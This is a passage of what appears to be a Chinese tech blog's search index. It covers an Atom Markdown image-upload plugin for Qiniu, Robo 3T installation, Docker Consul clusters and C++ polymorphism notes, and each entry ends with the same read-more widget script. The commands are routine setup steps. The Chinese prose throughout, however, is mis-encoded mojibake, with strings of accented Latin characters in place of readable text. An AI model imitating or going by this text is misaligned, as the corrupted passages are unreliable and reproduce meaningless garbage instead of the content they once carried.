æ–‡ç« ç¼–è¾‘ç•Œé¢ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Atom ç¼–å†™ Markdown å°†å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›å›¾åºŠ",url:"/posts/410644c5.html",text:'å‰è¨€ ä¸ƒç‰›äº‘å…è´¹æä¾› 30 å¤©æœ‰æ•ˆæœŸçš„ä¸ƒç‰›èåˆ CDN æµ‹è¯•åŸŸåï¼Œä¹Ÿæ”¯æŒç»‘å®šè‡ªå®šä¹‰åŸŸåï¼Œä½†è¦æ±‚è‡ªå®šä¹‰çš„åŸŸåå¿…é¡»å¤‡æ¡ˆ ä¸ƒç‰›äº‘æ¯æœˆä¼šå…è´¹æä¾› 10 GB å­˜å‚¨ç©ºé—´ã€10 GB ä¸‹è½½æµé‡ã€10 ä¸‡æ¬¡ PUT è¯·æ±‚ã€100 ä¸‡æ¬¡ GET è¯·æ±‚ï¼Œä½†å…è´¹æä¾›çš„å­˜å‚¨èµ„æºåªæ”¯æŒ HTTP åè®®è®¿é—®ï¼Œè‹¥éœ€è¦ä½¿ç”¨ HTTPS åè®®ï¼Œåˆ™éœ€è¦æŒ‰æµé‡ä»˜è´¹æ‰èƒ½å¤Ÿä½¿ç”¨ Atom ç¼–å†™ Markdown å°†å›¾ç‰‡åˆ°ä¸ƒç‰›å›¾åºŠï¼Œç¬¬ä¸€ç§æ–¹æ³•æ˜¯å®‰è£…ä¸¤æ¬¾æ’ä»¶ï¼Œåˆ†åˆ«æ˜¯ï¼šmarkdown-assistant + qiniu-uploaderï¼Œä¸æ”¯æŒä¸Šä¼ æœ¬åœ°æ–‡ä»¶åˆ°ä¸ƒç‰›äº‘ï¼Œåªæ”¯æŒå°†å‰ªè´´é¢æ¿é‡Œçš„å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›äº‘ï¼Œåœ¨æ–°ç‰ˆæœ¬çš„ Atom ä¸­å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ Atom ç¼–å†™ Markdown å°†å›¾ç‰‡åˆ°ä¸ƒç‰›å›¾åºŠï¼Œç¬¬äºŒç§æ–¹æ³•ç›´æ¥å®‰è£… md-writer-qiniu æ’ä»¶ï¼Œè¯¥æ’ä»¶æ˜¯åœ¨ markdown-writer çš„åŸºç¡€ä¸Šæ–°å¢äº†ä¸ƒç‰›å›¾ç‰‡ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæ”¯æŒä¸Šä¼ æœ¬åœ°å›¾ç‰‡åˆ°ä¸ƒç‰›äº‘ï¼Œæ”¯æŒå°†å‰ªè´´é¢æ¿é‡Œçš„å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°æˆ–è€…ä¸Šä¼ åˆ°ä¸ƒç‰›äº‘ Atom å®‰è£… md-writer-qiniu æ’ä»¶ 12345678910111213# è¿›å…¥ Atom æœ¬åœ°çš„æ’ä»¶ç›®å½•$ cd ~/.atom/packages# å…‹éš†ä»£ç ï¼Œæ–‡ä»¶å¤¹çš„åç§°å¿…é¡»æ˜¯ markdown-writer ï¼Œå³éœ€è¦å’Œ packagename ä¸€è‡´ï¼Œå¦åˆ™æ’ä»¶æ— æ³•æ­£å¸¸ä½¿ç”¨$ git clone https://github.com/chenghm123/md-writer-qiniu.git markdown-writer# è¿›å…¥æºç ç›®å½•$ cd markdown-writer# å®‰è£…ä¾èµ–$ npm install# é‡å¯ Atom md-writer-qiniu å¿«æ·é”®å†²çª md-writer-qiniu çš„å¿«æ·é”®é»˜è®¤æ˜¯ shift-ctrl-iï¼Œå¯èƒ½ä¼šä¸ toggle-dev-tools çš„å¿«æ·é”®å†²çªï¼Œå¯ä»¥ç¼–è¾‘ ~/.atom/keymap.cson æ–‡ä»¶ï¼Œæ›´æ”¹ md-writer-qiniu çš„å¿«æ·é”®ï¼Œå³ä¸‹é¢çš„ "shift-ctrl-v": "markdown-writer:insert-image"ï¼š 1234567891011121314$ vim ~/.atom/keymap.cson".platform-linux atom-text-editor:not([mini])": "shift-ctrl-K": "markdown-writer:insert-link" "shift-ctrl-v": "markdown-writer:insert-image" "shift-ctrl-X": "markdown-writer:toggle-taskdone" "ctrl-i": "markdown-writer:toggle-italic-text" "ctrl-b": "markdown-writer:toggle-bold-text" "ctrl-\'": "markdown-writer:toggle-code-text" "ctrl-h": "markdown-writer:toggle-strikethrough-text" "ctrl-1": "markdown-writer:toggle-h1" "ctrl-2": "markdown-writer:toggle-h2" "ctrl-3": "markdown-writer:toggle-h3" "ctrl-4": "markdown-writer:toggle-h4" "ctrl-5": "markdown-writer:toggle-h5" md-writer-qiniu æ’ä»¶é…ç½® é¦–å…ˆæ³¨å†Œä¸ƒç‰›äº‘çš„è´¦å·ï¼Œé€‰æ‹©â€ å¯¹è±¡å­˜å‚¨â€ äº§å“ï¼Œç„¶ååˆ›å»ºå­˜å‚¨ç©ºé—´ï¼ˆå¿…é¡»è®¾ç½®ä¸ºå…¬å¼€è®¿é—®ï¼‰ï¼Œæ¥ç€åœ¨ Atom çš„æ’ä»¶é…ç½®ä¸­å¡«å†™ä»¥ä¸‹å†…å®¹å³å¯ã€‚ Qiniu Bucket æ˜¯ä¸ƒç‰›äº‘å­˜å‚¨ç©ºé—´çš„åç§° Qiniu Domain æ˜¯ä¸ƒç‰›äº‘å­˜å‚¨ç©ºé—´çš„åŸŸå AccessKeyã€SecretKey å³æ˜¯åœ¨ä¸ƒç‰›äº‘ä¸­çš„ AKã€SK å¦‚æœå¸Œæœ›å°†å‰ªè´´é¢æ¿é‡Œçš„å›¾ç‰‡ä¿å­˜åˆ°æœ¬åœ°ç›®å½•ï¼Œéœ€è¦é…ç½® Hexo å›¾ç‰‡çš„é»˜è®¤ä¿å­˜ç›®å½•ï¼Œä¸‹è¿°é…ç½®æ˜¯å°†å›¾ç‰‡ä¿å­˜åœ¨ source/asset/{year}/{month} æœ¬åœ°ç›®å½•ä¸‹ï¼š md-writer-qiniu æ’ä»¶çš„ä½¿ç”¨ ä½¿ç”¨å¿«æ·æ–¹å¼ shift-ctrl-i æˆ–è€… shift-ctrl-vï¼Œè°ƒå‡ºå›¾ç‰‡ä¸Šä¼ çš„ç•Œé¢ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œä¹Ÿå¯ä»¥å¯¼èˆªåˆ°èœå•ï¼š Packages â€“&gt; Markdown Writer â€“&gt; Markup â€“&gt; Insert Imageã€‚åœ¨ä¸‹é¢çš„æ“ä½œå®Œæˆåï¼Œé»˜è®¤æŒ‰ä¸‹â€ å›è½¦é”® â€œï¼Œå³è¡¨ç¤ºå¼€å§‹ä¸Šä¼ å›¾ç‰‡æˆ–è€…ä¿å­˜å›¾ç‰‡åˆ° Hexo çš„å›¾ç‰‡ç›®å½•ã€‚ ç¬¬ä¸€ç§ä½¿ç”¨æƒ…å†µï¼šå½“å‰ªè´´é¢æ¿é‡Œæœ‰å›¾ç‰‡æ—¶ï¼Œå¦‚æœå‹¾é€‰äº† â€œSave Image Toâ€ï¼Œåˆ™åªä¼šå°†å‰ªè´´é¢æ¿é‡Œçš„å›¾ç‰‡ä¿å­˜åˆ° Hexo çš„å›¾ç‰‡ç›®å½•ï¼Œæ­¤æ—¶å¹¶ä¸ä¼šä¸Šä¼ åˆ°ä¸ƒç‰›äº‘ï¼›è‹¥ä¸å‹¾é€‰ï¼Œåˆ™é»˜è®¤ä¼šå°†å‰ªè´´é¢æ¿é‡Œçš„å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›äº‘ã€‚ ç¬¬äºŒç§ä½¿ç”¨æƒ…å†µï¼šå½“å‰ªè´´é¢æ¿é‡Œæ²¡æœ‰å›¾ç‰‡æ—¶ï¼Œæ­¤æ—¶ç‚¹å‡» â€œChoose Local Imageâ€ æŒ‰é’®ä»æœ¬åœ°é€‰æ‹©å›¾ç‰‡ï¼Œè‹¥å‹¾é€‰äº† â€Copy Image Toâ€ï¼Œåˆ™åªä¼šå½“æœ¬åœ°å›¾ç‰‡ä¿å­˜åˆ° Hexo çš„å›¾ç‰‡ç›®å½•ï¼Œæ­¤æ—¶å¹¶ä¸ä¼šä¸Šä¼ åˆ°ä¸ƒç‰›äº‘ï¼›è‹¥ä¸å‹¾é€‰ï¼Œåˆ™é»˜è®¤ä¼šå°†æœ¬åœ°å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›äº‘ã€‚ ä½¿ç”¨æ€»ç»“ï¼š è‹¥ä¸å‹¾é€‰ â€Save Image Toâ€œæˆ–è€… â€œCopy Image Toâ€ é€‰é¡¹ï¼Œé»˜è®¤ä¼šå°†å‰ªè´´é¢æ¿é‡Œçš„å›¾ç‰‡æˆ–è€…æœ¬åœ°å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›äº‘ åªè¦å‹¾é€‰äº† â€Save Image Toâ€œæˆ–è€… â€œCopy Image Toâ€ é€‰é¡¹ï¼Œéƒ½ä¸ä¼šå°†å‰ªè´´é¢æ¿é‡Œçš„å›¾ç‰‡æˆ–è€…æœ¬åœ°å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›äº‘ è¡¥å……è¯´æ˜ ä½¿ç”¨ä¸Šé¢æåˆ°çš„ md-writer-qiniu æ’ä»¶å°†å›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›äº‘åï¼Œé»˜è®¤çš„å›¾ç‰‡è·¯å¾„æ˜¯ {YYYY}/{MM}/{DD}/{HHmmss}{random-string}{extname} çš„æ ¼å¼ï¼Œ è¯¥æ’ä»¶ä¸æ”¯æŒè‡ªå®šä¹‰ä¸ƒç‰›äº‘é‡Œçš„å›¾ç‰‡æ–‡ä»¶å è‹¥éœ€è¦è‡ªå®šä¹‰ä¸ƒç‰›äº‘é‡Œçš„å›¾ç‰‡æ–‡ä»¶åï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªåˆ†æ”¯çš„ md-writer-qiniu æ’ä»¶ï¼ˆå®‰è£…æ–¹æ³•å’Œä¸Šé¢çš„æ’ä»¶ä¸€æ ·ï¼‰ï¼Œæ”¯æŒä½¿ç”¨è·¯å¾„å‰ç¼€ï¼ˆé’ˆå¯¹ä¸ƒç‰›äº‘çš„å­˜å‚¨è·¯å¾„ï¼‰ã€‚å½“åœ¨è¯¥æ’ä»¶çš„é…ç½®é¡¹é‡Œä¸å‹¾é€‰ Qiniu File Random Name é€‰é¡¹æ—¶ï¼Œé»˜è®¤çš„å›¾ç‰‡è·¯å¾„æ˜¯ {keyPrefix}/{YYYY}/{MM}/{title}{extname}ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥æŒ‡å®š Title ä½œä¸ºä¸ƒç‰›äº‘å›¾ç‰‡çš„æ–‡ä»¶åï¼Œå…·ä½“é…ç½®å¦‚ä¸‹å›¾ï¼š var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"æ—¥å¸¸ç½‘ç«™æ”¶è—",url:"/posts/16fab331.html",text:'åšå®¢ äº‘é£çš„ BLOG ç¨šæ™–çš„ BLOGï¼ˆåšä¸»å…¥é€‰äº†åä¸ºå¤©æ‰å°‘å¹´è®¡åˆ’ï¼‰ ç”µå½±èµ„æº äººäººç”µå½±ç½‘ äººäººç”µå½±ç½‘ï¼ˆå¤‡ç”¨ï¼‰ PDF èµ„æº PDF ç”µå­ä¹¦ Docker åŠ é€Ÿ Docker çš„å®‰è£…åŒ…ä»¥åŠå‘¨è¾¹é«˜é€Ÿé•œåƒ ç½‘ç«™æµ‹é€Ÿã€ç½‘ç«™ä¼˜åŒ–å·¥å…· ç«™é•¿å·¥å…· - ç½‘é€Ÿæµ‹è¯• GTmetrix - ç½‘ç«™é€Ÿåº¦è¯Šæ–­ Webkaka - ç½‘ç«™é€Ÿåº¦æµ‹è¯• Webkaka - ç½‘ç«™é€Ÿåº¦è¯Šæ–­ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç”Ÿæ´»éšç¬”"},{title:"Linux å®‰è£… Robo 3Tï¼ˆRobomongoï¼‰",url:"/posts/1f8b78c4.html",text:'ç›¸å…³ç«™ç‚¹ Robo 3T å®˜ç½‘ Robo 3T å®˜æ–¹ä¸‹è½½ Robo 3T Github é¡¹ç›® Robo 3T Snap Github é¡¹ç›® ä»‹ç» Robo 3T æ˜¯ä¸€æ¬¾è·¨å¹³å°çš„ MongoDB å¯è§†åŒ–å·¥å…·ï¼Œåœ¨ç®¡ç†æ•°æ®åº“å†…å®¹ä»¥åŠæ•°æ®åº“ä»£ç ç¼–è¾‘æ–¹é¢æä¾›ä¸€å®šçš„å¼€å‘ä¼˜åŒ–æ–¹æ¡ˆï¼Œå†…ç½®ä¸€ä¸ªä»£ç ç¼–è¾‘åŒºåŸŸï¼Œæ”¯æŒå°†æ•°æ®åº“æ–‡ä»¶æ”¾åˆ°è½¯ä»¶ä¸Šä¿®æ”¹ï¼Œç»“åˆå›¾å½¢åŒ–çš„å¤„ç†æ–¹å¼ï¼Œå¯ä»¥å°† MongoDB æ•°æ®åº“ä¸­çš„æ–‡ä»¶è½¬æ¢ä¸ºåˆ†å¸ƒå¼çš„å­˜å‚¨æ–¹å¼ï¼Œæé«˜æ•°æ®æ–‡ä»¶ç¼–è¾‘å’Œä¿å­˜æ•ˆç‡ã€‚Robo 3T çš„å‰èº«æ˜¯ Robomongoï¼Œåœ¨æ–°ç‰ˆæœ¬ä¸­ï¼Œå¯ä»¥æ›´åŠ æ–¹ä¾¿åœ°æŸ¥æ‰¾æ•°æ®åº“å¯¹è±¡ã€åˆ©ç”¨å…¶ä¸­çš„æ•°æ®ç”Ÿæˆå™¨ï¼Œå¯ä»¥å°† Excel æ–‡ä»¶çš„æ•°æ®å¯¼å…¥æ•°æ®åº“ä¸­ä¿å­˜ï¼Œå¯¹äºåˆ¶ä½œæ•°æ®æ–‡ä»¶æ¥è¯´æ˜¯éå¸¸æ–¹ä¾¿çš„ã€‚ å®‰è£…è¯´æ˜ ç”±äº Robo 3T æ˜¯åŸºäº C++ å¼€å‘çš„ï¼Œä¸ºäº†é¿å…å®‰è£…è¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°çš„ GLibc ä¾èµ–é”™è¯¯ï¼Œä¸‹é¢ç›´æ¥é€šè¿‡ Snap æ¥å®‰è£… Robomongoï¼Œè¿™æ ·ä¹Ÿæ–¹ä¾¿ä»¥åç®¡ç†è½¯ä»¶çš„æ›´æ–°ï¼Œæ­¤å®‰è£…æ–¹å¼é€‚ç”¨äº Centosã€Debianã€Ubuntu ç­‰ Liinux å‘è¡Œç‰ˆã€‚ 12345678910111213141516171819202122# å®‰è£…# snap install robo3t-snap# æŸ¥çœ‹å®‰è£…çŠ¶æ€# snap list# åˆ›å»ºå¿«æ·æ–¹å¼# vim /usr/share/applications/robo3t.desktop[Desktop Entry]Name=Robo3tComment=Robo 3T (formerly Robomongo) is the free lightweight GUI for MongoDB enthusiasts.Exec=/snap/bin/robo3t-snap %UTerminal=falseType=ApplicationIcon=/var/lib/snapd/snap/robo3t-snap/current/meta/gui/icon.pngCategories=GNOME;GTK;Development;MimeType=text/plain;# èœå•æ å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; ç¼–ç¨‹ --&gt; Robo3tï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼å¯åŠ¨åº”ç”¨ï¼Œåº”ç”¨å¯åŠ¨åçš„ç•Œé¢æˆªå›¾å¦‚ä¸‹# æˆ–è€…ç›´æ¥ä½¿ç”¨å‘½ä»¤æ¥å¯åŠ¨ï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·æƒé™ï¼‰$ /snap/bin/robo3t-snap Robo 3T ç•Œé¢ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux å¼€å‘å·¥å…·"},{title:"Docker å®‰è£… Consul",url:"/posts/224f5100.html",text:'ç›¸å…³ç«™ç‚¹ Consul å®˜æ–¹å®‰è£…æ•™ç¨‹ Consul Docker å®˜æ–¹å®‰è£…æ•™ç¨‹ æ‹‰å– Consul é•œåƒ 12345# æ‹‰å–æœ€æ–°ç‰ˆæœ¬çš„é•œåƒ# docker pull consul:latest# æ‹‰å–ç‰¹å®šç‰ˆæœ¬çš„é•œåƒ# docker pull consul:1.7.3 Docker å®‰è£… Consulï¼ˆå•æœºï¼‰ 1234567# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼Œé»˜è®¤æ˜¯ä»¥å¼€å‘æ¨¡å¼å¯åŠ¨ï¼Œæ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­# docker run -d --name=consul -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7c43babcc760 consul:1.7.3 "docker-entrypoint.sâ€¦" 38 seconds ago Up 37 seconds 8300-8302/tcp, 8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul Docker å®‰è£… Consulï¼ˆé›†ç¾¤ï¼‰ ä¸‹é¢å°†æ¼”ç¤ºåœ¨å¼€å‘æ¨¡å¼ä¸‹ï¼Œå¦‚ä½•åˆ›å»ºæ‹¥æœ‰ 3 ä¸ªèŠ‚ç‚¹çš„ Consul é›†ç¾¤ï¼Œæ•°æ®é»˜è®¤ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå¼€å‘æ¨¡å¼ä¸‹å¯ä»¥ç›´æ¥é€šè¿‡ 8500 ç«¯å£è®¿é—® Consul çš„ WebUI ç•Œé¢ã€‚ 12345678910111213141516171819202122232425262728# åˆ›å»ºå¹¶å¯åŠ¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹# docker run -d --name=consul-node1 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3# æŸ¥çœ‹ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„IP# docker inspect -f=\'{{.NetworkSettings.IPAddress}}\' consul-node1# åˆ›å»ºå¹¶å¯åŠ¨ç¬¬äºŒä¸ªèŠ‚ç‚¹ï¼Œ172.17.0.3æ˜¯ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„IP# docker run -d --name=consul-node2 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3 agent -dev -join=172.17.0.3# åˆ›å»ºå¹¶å¯åŠ¨ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹ï¼Œ172.17.0.3æ˜¯ç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„IP# docker run -d --name=consul-node3 -p 8500:8500 -e CONSUL_BIND_INTERFACE=eth0 consul:1.7.3 agent -dev -join=172.17.0.3# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES1ac5832f79f4 consul:1.7.3 "docker-entrypoint.sâ€¦" 31 seconds ago Up 30 seconds 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node3533b0f12877a consul:1.7.3 "docker-entrypoint.sâ€¦" 56 seconds ago Up 55 seconds 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node2d25f90dffa94 consul:1.7.3 "docker-entrypoint.sâ€¦" 2 minutes ago Up 2 minutes 8300-8302/tcp, 8500-8500/tcp, 8301-8302/udp, 8600/tcp, 8600/udp consul-node1# åœ¨ç¬¬ä¸€ä¸ªå®¹å™¨ä¸­è¿è¡Œconsulå‘½ä»¤æ¥æŸ¥è¯¢é›†ç¾¤ä¸­çš„æ‰€æœ‰æˆå‘˜# docker exec -t consul-node1 consul membersNode Address Status Type Build Protocol DC Segment1ac5832f79f4 172.17.0.5:8301 alive server 1.7.3 2 dc1 &lt;all&gt;533b0f12877a 172.17.0.4:8301 alive server 1.7.3 2 dc1 &lt;all&gt;d25f90dffa94 172.17.0.3:8301 alive server 1.7.3 2 dc1 &lt;all&gt;# è®¿é—®webç®¡ç†ç•Œé¢# æµè§ˆå™¨è®¿é—®ï¼šhttp://172.17.0.3:8500 Consul å®¹å™¨çš„æŒä¹…åŒ– åœ¨å¼€å‘æ¨¡å¼ä¸‹å¯åŠ¨ Consul å®¹å™¨ï¼Œæ•°æ®é»˜è®¤ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå®¹å™¨é‡å¯åæ•°æ®ä¼šä¸¢å¤±ï¼›è‹¥æƒ³ä½¿ç”¨ Docker çš„æ•°æ®å·æŒä¹…åŒ–å®¹å™¨é‡Œçš„æ•°æ®ï¼Œå¯ä»¥æŒ‚è½½ä»¥ä¸‹ç›®å½•ï¼Œå¦‚ docker -v /usr/share/consul/data:/consul/dataã€‚ /consul/dataï¼šConsul å­˜æ”¾æ•°æ®çš„ç›®å½• /consul/configï¼šConsul å­˜æ”¾é…ç½®æ–‡ä»¶çš„ç›®å½• var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"C++ åŸºç¡€é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/c62ca067.html",text:'å¤šæ€è¯·è°ˆè°ˆå¯¹å¤šæ€çš„ç†è§£ å¤šæ€çš„å®ç°æ•ˆæœ å¤šæ€æ˜¯åœ¨è¿è¡ŒæœŸé—´æ ¹æ®å…·ä½“å¯¹è±¡çš„ç±»å‹å†³å®šå‡½æ•°è°ƒç”¨ï¼ŒåŒæ ·çš„è°ƒç”¨è¯­å¥æœ‰å¤šç§ä¸åŒçš„è¡¨ç°å½¢æ€ å¤šæ€å®ç°çš„ä¸‰ä¸ªå¿…è¦æ¡ä»¶ æœ‰ç»§æ‰¿ã€æœ‰è™šå‡½æ•°ï¼ˆvirtual ï¼‰çš„é‡å†™ã€æœ‰çˆ¶ç±»çš„æŒ‡é’ˆï¼ˆå¼•ç”¨ï¼‰æŒ‡å‘å­ç±»å¯¹è±¡ å¤šæ€çš„ C++ å®ç° ä½¿ç”¨ virtual å…³é”®å­—ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨è¿™ä¸ªå‡½æ•°è¦æ”¯æŒå¤šæ€ï¼›ä¸æ˜¯æ ¹æ®æŒ‡é’ˆç±»å‹åˆ¤æ–­å¦‚ä½•è°ƒç”¨ï¼Œè€Œæ˜¯è¦æ ¹æ®æŒ‡é’ˆæ‰€æŒ‡å‘çš„å®é™…å¯¹è±¡ç±»å‹æ¥åˆ¤æ–­å¦‚ä½•è°ƒç”¨ å¤šæ€çš„ç†è®ºåŸºç¡€ åŠ¨æ€è”ç¼– Vs é™æ€è”ç¼–ï¼Œæ ¹æ®å®é™…çš„å¯¹è±¡ç±»å‹æ¥åˆ¤æ–­é‡å†™å‡½æ•°çš„è°ƒç”¨ å¤šæ€çš„é‡è¦æ„ä¹‰ å¤šæ€æ˜¯è®¾è®¡æ¨¡å¼çš„åŸºç¡€ï¼Œæ˜¯æ¡†æ¶çš„åŸºçŸ³ å®ç°å¤šæ€çš„ç†è®ºåŸºç¡€ å‡½æ•°æŒ‡é’ˆåšå‡½æ•°å‚æ•° å‡½æ•°æŒ‡é’ˆä¸€èˆ¬æœ‰ä¸¤ç§ç”¨æ³•ï¼ˆæ­£ã€åï¼‰ å¤šæ€åŸç†çš„æ¢ç©¶ ä¸é¢è¯•å®˜å±•å¼€è®¨è®º è°ˆè°ˆå¯¹é‡å†™ä¸é‡è½½ç†è§£ å‡½æ•°é‡è½½ å¿…é¡»åœ¨åŒä¸€ä¸ªç±»ä¸­è¿›è¡Œ å­ç±»æ— æ³•é‡è½½çˆ¶ç±»çš„å‡½æ•°ï¼Œçˆ¶ç±»åŒåå‡½æ•°å°†è¢«å­ç±»çš„è¦†ç›– é‡è½½æ˜¯åœ¨ç¼–è¯‘æœŸé—´æ ¹æ®å‚æ•°ç±»å‹ã€ä¸ªæ•°å’Œé¡ºåºå†³å®šå‡½æ•°çš„è°ƒç”¨ å‡½æ•°é‡å†™ å¿…é¡»å‘ç”Ÿäºçˆ¶ç±»ä¸å­ç±»ä¹‹é—´ çˆ¶ç±»ä¸å­ç±»ä¸­çš„å‡½æ•°å¿…é¡»æœ‰å®Œå…¨ç›¸åŒçš„åŸå‹ ä½¿ç”¨ virtual å…³é”®å­—å£°æ˜ä¹‹åï¼Œèƒ½å¤Ÿäº§ç”Ÿå¤šæ€ï¼ˆå¦‚æœä¸ä½¿ç”¨ virtual å…³é”®å­—å£°æ˜ï¼Œé‚£å«é‡å®šä¹‰ï¼‰ åœ¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•°ï¼Œèƒ½å®ç°å¤šæ€å—å­ç±»çš„ VPTR æŒ‡é’ˆæ˜¯åˆ†æ­¥å®Œæˆåˆå§‹åŒ–çš„ï¼Œå½“æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°æ—¶ï¼Œå­ç±» çš„ VPTR æŒ‡é’ˆæŒ‡å‘çˆ¶ç±»çš„è™šå‡½æ•°è¡¨ï¼Œå½“çˆ¶ç±»çš„æ„é€ å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œä¼šæŠŠå­ç±»çš„ VPTR æŒ‡é’ˆæŒ‡å‘å­ç±»çš„è™šå‡½æ•°è¡¨ã€‚å› æ­¤ï¼Œåœ¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•°ï¼Œä¸èƒ½å®ç°å¤šæ€ã€‚ åˆ†æå›¾è§£ å¦‚å›¾ æ‰€ç¤º å¯¹è±¡åœ¨åˆ›å»ºçš„æ—¶ï¼Œç”±ç¼–è¯‘å™¨å¯¹ VPTR æŒ‡é’ˆè¿›è¡Œåˆå§‹åŒ– åªæœ‰å½“å¯¹è±¡çš„æ„é€ å…¨éƒ¨å®Œæˆåï¼ŒVPTR æŒ‡é’ˆçš„æŒ‡å‘æ‰èƒ½æœ€ç»ˆç¡®å®š var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": 